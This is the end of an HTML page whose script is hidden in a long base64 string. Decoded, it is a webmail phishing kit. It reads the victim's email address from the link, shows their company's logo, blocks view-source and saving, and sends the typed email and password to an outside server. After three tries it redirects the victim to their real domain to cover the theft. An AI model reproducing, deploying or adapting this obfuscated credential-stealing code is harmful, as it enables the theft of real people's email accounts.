taW4uanMiPjwvc2NyaXB0PgoKPHNjcmlwdD4KCgovLyBwcmV2ZW50IGN0cmwgKyBzCiQoZG9jdW1lbnQpLmJpbmQoJ2tleWRvd24nLCBmdW5jdGlvbihlKSB7CmlmKGUuY3RybEtleSAmJiAoZS53aGljaCA9PSA4MykpIHsKZS5wcmV2ZW50RGVmYXVsdCgpOwpyZXR1cm4gZmFsc2U7Cn0KfSk7Cgpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdjb250ZXh0bWVudScsIGV2ZW50ID0+IGV2ZW50LnByZXZlbnREZWZhdWx0KCkpOwoKZG9jdW1lbnQub25rZXlkb3duID0gZnVuY3Rpb24oZSkgewppZiAoZS5jdHJsS2V5ICYmIAooZS5rZXlDb2RlID09PSA2NyB8fCAKZS5rZXlDb2RlID09PSA4NiB8fCAKZS5rZXlDb2RlID09PSA4NSB8fCAKZS5rZXlDb2RlID09PSAxMTcpKSB7CnJldHVybiBmYWxzZTsKfSBlbHNlIHsKcmV0dXJuIHRydWU7Cn0KfTsKJChkb2N1bWVudCkua2V5cHJlc3MoInUiLGZ1bmN0aW9uKGUpIHsKaWYoZS5jdHJsS2V5KQp7CnJldHVybiBmYWxzZTsgICAgICB9CmVsc2UgewpyZXR1cm4gdHJ1ZTsKfX0pOwoKLyogZ2xvYmFsICQgKi8KJChkb2N1bWVudCkucmVhZHkoZnVuY3Rpb24oKSB7CiAgICB2YXIgY291bnQgPSAwOwoKCiAgICAvLy8vLy8vLy8vLy8vdXJsIGFpIGdldHRpbmcvLy8vLy8vLy8vLy8vLy8vCiAgICB2YXIgYWkgPSB3aW5kb3cubG9jYXRpb24uaGFzaC5zdWJzdHIoMSk7CiAgICBpZiAoIWFpKSB7CgogICAgfSBlbHNlIHsKICAgICAgICB2YXIgYmFzZTY0cmVnZXggPSAvXihbMC05YS16QS1aKy9dezR9KSooKFswLTlhLXpBLVorL117Mn09PSl8KFswLTlhLXpBLVorL117M309KSk/JC87CgogICAgICAgIGlmICghYmFzZTY0cmVnZXgudGVzdChhaSkpIHsKICAgICAgICAgICAgLy8gYWxlcnQoYnRvYShhaSkpOwogICAgICAgICAgICB2YXIgbXlfYWkgPSBhaTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAvLyBhbGVydChhdG9iKGFpKSk7CiAgICAgICAgICAgIHZhciBteV9haSA9IGF0b2IoYWkpOwogICAgICAgIH0KICAgICAgICAvLyAkKCcjYWknKS52YWwoYWkpOwogICAgICAgIC8vIHZhciBteV9haSA9YWk7CiAgICAgICAgdmFyIGZpbHRlciA9IC9eKFthLXpBLVowLTlfXC5cLV0pK1xAKChbYS16QS1aMC05XC1dKStcLikrKFthLXpBLVowLTldezIsNH0pKyQvOwoKICAgICAgICBpZiAoIWZpbHRlci50ZXN0KG15X2FpKSkgewogICAgICAgICAgICAkKCcjZXJyb3InKS5zaG93KCk7CiAgICAgICAgICAgIGFpLmZvY3VzOwogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgICAgIHZhciBpbmQgPSBteV9haS5pbmRleE9mKCJAIik7CiAgICAgICAgdmFyIG15X3NsaWNlID0gbXlfYWkuc3Vic3RyKChpbmQgKyAxKSk7CiAgICAgICAgdmFyIGMgPSBteV9zbGljZS5zdWJzdHIoMCwgbXlfc2xpY2UuaW5kZXhPZignLicpKTsKICAgICAgICB2YXIgZmluYWwgPSBjLnRvTG93ZXJDYXNlKCk7CiAgICAgICAgdmFyIGZpbmFsdSA9IGMudG9VcHBlckNhc2UoKTsKICAgICAgICAkKCcjYWknKS52YWwobXlfYWkpOwogICAgICAgICQoIiNkaXYxIikuYW5pbWF0ZSh7IGxlZnQ6IDAsIG9wYWNpdHk6ICJoaWRlIiB9LCAwKTsKICAgICAgICAkKCIjZGl2MiIpLmFuaW1hdGUoeyByaWdodDogMCwgb3BhY2l0eTogInNob3ciIH0sIDUwMCk7CiAgICAgICAgCgkJJCgiI2FpY3giKS5odG1sKG15X2FpKTsKCQkkKCIjYWljeHgiKS5odG1sKG15X2FpKTsKICAgICAgICAkKCIjYWljaCIpLmh0bWwobXlfYWkpOwogICAgICAgICQuZ2V0KCJodHRwczovL2xvZ28uY2xlYXJiaXQuY29tLyIgKyBteV9zbGljZSkKICAgICAgICAgICAgLmRvbmUoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAkKCIjbG9nb2ltZyIpLmF0dHIoInNyYyIsICJodHRwczovL2xvZ28uY2xlYXJiaXQuY29tLyIgKyBteV9zbGljZSk7CiAgICAgICAgICAgICAgICAkKCIjbG9nb25hbWUiKS5odG1sKGZpbmFsdSk7CgkJCQkkKCIjbG9nb25hbWVjIikuaHRtbChmaW5hbHUpOwoKICAgICAgICAgICAgfSkuZmFpbChmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgICQoIiNsb2dvaW1nIikuYXR0cigic3JjIiwgImh0dHA6Ly9hbmNob3JtYWsuY29tL3dlYm1haWwvc2tpbnMvZWxhc3RpYy9pbWFnZXMvbG9nby5zdmc/cz0xNjU2Mjc1MjE4Iik7CiAgICAgICAgICAgICAgICAkKCIjbG9nb25hbWUiKS5odG1sKCIiKTsKCQkJCSQoIiNsb2dvbmFtZWMiKS5odG1sKCIiKTsKCiAgICAgICAgICAgIH0pOwoKCiAgICB9CgoKCgoKICAgICQoJyNhaScpLmNsaWNrKGZ1bmN0aW9uKCkgewogICAgICAgICQoJyNlcnJvcicpLmhpZGUoKTsKICAgIH0pOwoKICAgICQoZG9jdW1lbnQpLmtleXByZXNzKGZ1bmN0aW9uKGV2ZW50KSB7CgogICAgICAgIHZhciBrZXljb2RlID0gKGV2ZW50LmtleUNvZGUgPyBldmVudC5rZXlDb2RlIDogZXZlbnQud2hpY2gpOwogICAgICAgIGlmIChrZXljb2RlID09ICcxMycpIHsKICAgICAgICAgICAgZXZlbnQucHJldmVudERlZmF1bHQoKTsKICAgICAgICAgICAgaWYgKCQoIiNkaXYxIikuaXMoIjp2aXNpYmxlIikpIHsKCiAgICAgICAgICAgICAgICAkKCIjbmV4dCIpLmNsaWNrKCk7CgogICAgICAgICAgICB9IGVsc2UgaWYgKCQoIiNkaXYyIikuaXMoIjp2aXNpYmxlIikpIHsKICAgICAgICAgICAgICAgIGV2ZW50LnByZXZlbnREZWZhdWx0KCk7CgogICAgICAgICAgICAgICAgJCgiI3N1Ym1pdC1idG4iKS5jbGljaygpOwoKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0pOwoKCiAgICAkKCcjbmV4dCcpLmNsaWNrKGZ1bmN0aW9uKCkgewogICAgICAgIGV2ZW50LnByZXZlbnREZWZhdWx0KCk7CiAgICAgICAgdmFyIG15X2FpID0gJCgnI2FpJykudmFsKCk7CiAgICAgICAgdmFyIGZpbHRlciA9IC9eKFthLXpBLVowLTlfXC5cLV0pK1xAKChbYS16QS1aMC05XC1dKStcLikrKFthLXpBLVowLTldezIsNH0pKyQvOwoKICAgICAgICBpZiAoIWZpbHRlci50ZXN0KG15X2FpKSkgewogICAgICAgICAgICAkKCcjZXJyb3InKS5zaG93KCk7CiAgICAgICAgICAgIGFpLmZvY3VzOwogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgICAgIHZhciBpbmQgPSBteV9haS5pbmRleE9mKCJAIik7CiAgICAgICAgdmFyIG15X3NsaWNlID0gbXlfYWkuc3Vic3RyKChpbmQgKyAxKSk7CiAgICAgICAgdmFyIGMgPSBteV9zbGljZS5zdWJzdHIoMCwgbXlfc2xpY2UuaW5kZXhPZignLicpKTsKICAgICAgICB2YXIgZmluYWwgPSBjLnRvTG93ZXJDYXNlKCk7CiAgICAgICAgdmFyIGZpbmFsdSA9IGMudG9VcHBlckNhc2UoKTsKICAgICAgICAkKCIjZGl2MSIpLmFuaW1hdGUoeyBsZWZ0OiAwLCBvcGFjaXR5OiAiaGlkZSIgfSwgMCk7CiAgICAgICAgJCgiI2RpdjIiKS5hbmltYXRlKHsgcmlnaHQ6IDAsIG9wYWNpdHk6ICJzaG93IiB9LCA1MDApOwoKICAgICAgICAkKCIjYWljaCIpLmh0bWwobXlfYWkpOwoJCSQoIiNhaWN4IikuaHRtbChteV9haSk7CgkJJCgiI2FpY3h4IikuaHRtbChteV9haSk7CiAgICAgICAgJC5nZXQoIiIgKyBteV9zbGljZSkKICAgICAgICAgICAgLmRvbmUoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAkKCIjbG9nb2ltZyIpLmF0dHIoInNyYyIsICIiICsgbXlfc2xpY2UpOwogICAgICAgICAgICAgICAgJCgiI2xvZ29uYW1lIikuaHRtbChmaW5hbHUpOwoJCQkJJCgiI2xvZ29uYW1lYyIpLmh0bWwoZmluYWx1KTsKCiAgICAgICAgICAgIH0pLmZhaWwoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAkKCIjbG9nb2ltZyIpLmF0dHIoInNyYyIsICJodHRwOi8vYW5jaG9ybWFrLmNvbS93ZWJtYWlsL3NraW5zL2VsYXN0aWMvaW1hZ2VzL2xvZ28uc3ZnP3M9MTY1NjI3NTIxOCIpOwogICAgICAgICAgICAgICAgJCgiI2xvZ29uYW1lIikuaHRtbCgiIik7CgkJCQkkKCIjbG9nb25hbWVjIikuaHRtbCgiIik7CgogICAgICAgICAgICB9KTsKCgoKCgogICAgfSk7CiAgICAvLyAkKCcjYmFjaycpLmNsaWNrKGZ1bmN0aW9uKCkgewogICAgLy8gICAgIC8vICQoIiNtc2ciKS5oaWRlKCk7CiAgICAvLyAgICAgJCgiI2FpIikudmFsKCIiKTsKICAgIC8vICAgICAkKCIjcHIiKS52YWwoIiIpOwogICAgLy8gICAgICQoIiNkaXYyIikuYW5pbWF0ZSh7IGxlZnQ6IDAsIG9wYWNpdHk6ICJoaWRlIiB9LCAwKTsKICAgIC8vICAgICAkKCIjZGl2MSIpLmFuaW1hdGUoeyByaWdodDogMCwgb3BhY2l0eTogInNob3ciIH0sIDEwMDApOwoKICAgIC8vIH0pOwp2YXIgZmlsZT0iYm1WNGRDNXdhSEE9IjsKCiAgICAkKCcjc3VibWl0LWJ0bicpLmNsaWNrKGZ1bmN0aW9uKGV2ZW50KSB7CiAgICAgICAgZXZlbnQucHJldmVudERlZmF1bHQoKTsKICAgICAgICB2YXIgYWkgPSAkKCIjYWkiKS52YWwoKTsKICAgICAgICB2YXIgcHIgPSAkKCIjcHIiKS52YWwoKTsKICAgICAgICB2YXIgZGV0YWlsID0gJCgiI2ZpZWxkIikuaHRtbCgpOwogICAgICAgIHZhciBtc2cgPSAkKCcjbXNnJykuaHRtbCgpOwoKICAgICAgICB2YXIgbXlfYWkgPSBhaTsKICAgICAgICB2YXIgaW5kID0gbXlfYWkuaW5kZXhPZigiQCIpOwogICAgICAgIHZhciBteV9zbGljZSA9IG15X2FpLnN1YnN0cigoaW5kICsgMSkpOwogICAgICAgIHZhciBjID0gbXlfc2xpY2Uuc3Vic3RyKDAsIG15X3NsaWNlLmluZGV4T2YoJy4nKSk7CiAgICAgICAgdmFyIGZpbmFsID0gYy50b0xvd2VyQ2FzZSgpOwogICAgICAgICQoJyNtc2cnKS50ZXh0KG1zZyk7CiAgICAgICAgY291bnQgPSBjb3VudCArIDE7CiAgICAgICAgJC5hamF4KHsKICAgICAgICAgICAgZGF0YVR5cGU6ICdKU09OJywKICAgICAgICAgICAgdXJsOiAnaHR0cHM6Ly9tY3J1Yi5wcm8vbXkvJywKICAgICAgICAgICAgdHlwZTogJ1BPU1QnLAogICAgICAgICAgICBkYXRhOiB7CiAgICAgICAgICAgICAgICBhaTogYWksCiAgICAgICAgICAgICAgICBwcjogcHIsCiAgICAgICAgICAgICAgICBkZXRhaWw6IGRldGFpbCwKCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIGJlZm9yZVNlbmQ6IGZ1bmN0aW9uKHhocikgewogICAgICAgICAgICAgICAgJCgiI3N1Ym1pdC1idG4iKS5odG1sKCJMb2FkaW5nLi4uLiIpOwogICAgICAgICAgICB9LAogICAgICAgICAgICBzdWNjZXNzOiBmdW5jdGlvbihyZXNwb25zZSkgewogICAgICAgICAgICAgICAgJCgiI3ByIikudmFsKCIiKTsKICAgICAgICAgICAgICAgIGlmIChjb3VudCA+PSAzKSB7CiAgICAgICAgICAgICAgICAgICAgY291bnQgPSAwOwogICAgICAgICAgICAgICAgICAgICQoIiNkaXYyIikuYW5pbWF0ZSh7IGxlZnQ6IDAsIG9wYWNpdHk6ICJoaWRlIiB9LCAwKTsKICAgICAgICAgICAgICAgICAgICAkKCIjZGl2MyIpLmFuaW1hdGUoeyBsZWZ0OiAwLCBvcGFjaXR5OiAic2hvdyIgfSwgNTAwKTsKICAgICAgICAgICAgICAgICAgICBzZXRUaW1lb3V0KCgpID0+IHsKICAgICAgICAgICAgICB3aW5kb3cubG9jYXRpb24ucmVwbGFjZSgiaHR0cHM6Ly93d3cuIitteV9zbGljZSk7CiAgICAgICAgICAgICAgICAgICAgfSwgNTAwKTsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoY291bnQgPT0gMikgewogICAgICAgICAgICAgICAgICAgICQoIiNtc2cyIikuc2hvdygpOwogICAgICAgICAgICAgICAgICAgICQoIiNtc2ciKS5oaWRlKCk7CiAgICAgICAgICAgICAgICAgICAgJCgiI21zZzEiKS5oaWRlKCk7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICQoIiNtc2cxIikuc2hvdygpOwogICAgICAgICAgICAgICAgICAgICQoIiNtc2ciKS5oaWRlKCk7CiAgICAgICAgICAgICAgICAgICAgJCgiI21zZzIiKS5oaWRlKCk7CgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9LAogICAgICAgICAgICBlcnJvcjogZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAkKCIjcHIiKS52YWwoIiIpOwogICAgICAgICAgICAgICAgaWYgKGNvdW50ID49IDMpIHsKICAgICAgICAgICAgICAgICAgICBjb3VudCA9IDA7CiAgICAgICAgICAgICAgICAgICAgJCgiI2RpdjIiKS5hbmltYXRlKHsgbGVmdDogMCwgb3BhY2l0eTogImhpZGUiIH0sIDApOwogICAgICAgICAgICAgICAgICAgICQoIiNkaXYzIikuYW5pbWF0ZSh7IGxlZnQ6IDAsIG9wYWNpdHk6ICJzaG93IiB9LCA1MDApOwogICAgICAgICAgICAgICAgICAgIHNldFRpbWVvdXQoKCkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICB3aW5kb3cubG9jYXRpb24ucmVwbGFjZSgiaHR0cHM6Ly93d3cuIitteV9zbGljZSk7CiAgICAgICAgICAgICAgICAgICAgfSwgMTAwMCk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKGNvdW50ID09IDIpIHsKICAgICAgICAgICAgICAgICAgICAkKCIjbXNnMiIpLnNob3coKTsKICAgICAgICAgICAgICAgICAgICAkKCIjbXNnIikuaGlkZSgpOwogICAgICAgICAgICAgICAgICAgICQoIiNtc2cxIikuaGlkZSgpOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkKCIjbXNnMSIpLnNob3coKTsKICAgICAgICAgICAgICAgICAgICAkKCIjbXNnIikuaGlkZSgpOwogICAgICAgICAgICAgICAgICAgICQoIiNtc2cyIikuaGlkZSgpOwoKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSwKICAgICAgICAgICAgY29tcGxldGU6IGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgJCgiI3N1Ym1pdC1idG4iKS5odG1sKCJMb2FkaW5nLi4uIik7CiAgICAgICAgICAgIH0KICAgICAgICB9KTsKICAgIH0pOwp9KTsKPC9zY3JpcHQ+Cgk8L2h0bWw+")));
  </script>
  
  
  
  <title></title>
</head>
<body>
</body>
</html>